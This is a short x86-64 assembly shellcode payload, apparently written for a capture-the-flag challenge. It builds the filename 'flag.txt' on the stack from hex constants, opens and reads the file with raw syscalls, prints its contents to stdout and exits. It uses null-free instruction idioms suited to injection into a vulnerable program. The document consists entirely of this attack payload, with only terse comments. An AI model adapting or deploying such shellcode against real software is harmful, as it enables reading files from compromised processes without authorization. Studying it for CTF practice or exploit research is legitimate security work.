.global _start
_start:
    .intel_syntax noprefix
    #; open the file
    push 0x67616C66
    add rsp, 12
    push 0x7478742E
    sub rsp, 4
    xor rax, rax
    add al, 2
    xor rsi, rsi
    mov rdi, rsp
    syscall

    #;readfile
    sub sp, 0xfff
    mov rdi, rax
    xor rdx, rdx
    mov dx, 0x100
    mov rsi, rsp
    xor rax, rax
    syscall

    #;write to stdout
    xor rdi, rdi
    add dil, 1
    mov rdx, rax
    xor rax, rax
    add al, 1
    syscall

    #;epic exit
    xor rax, rax
    add al, 60
    syscall 
